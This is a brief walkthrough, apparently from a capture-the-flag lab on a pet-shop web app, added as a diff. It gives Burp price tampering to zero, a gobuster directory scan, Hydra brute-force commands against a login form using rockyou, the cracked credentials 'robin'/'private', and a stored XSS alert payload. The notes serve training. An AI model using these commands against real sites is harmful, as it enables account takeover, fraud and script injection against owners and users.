@@ -1,0 +1,17 @@
+1. intercept traffic web with burpsuit
+2. click in add cart and checkout(intercep)
+3. modify value or price of pets and put it 0 (free shop)
+4. with gobuster o dirb found page or file in url
+typing: 
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q -u <URL>
+5. found login page apply sqlinjection but it's blocked
+apply hydra; typing
+5.1 sudo hydra -L /usr/share/seclist/Passwords/Leaked-Databases/rockyou.txt -p "doesntmatter" <ip machine> https-post-form "login:username=^USER^&password=^PASS^:Invalid username" -t 32
+5.2 sudo hydra -l robin -P /usr/share/seclist/Password/Leaked-Databases/rockyou.txt <ip machine> https-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -t 32
+
+username: robin password: private
+
+6. XSS in edit pets 
+<script>alert("hello hacker")</script> in name and description of
+pet's post.
+
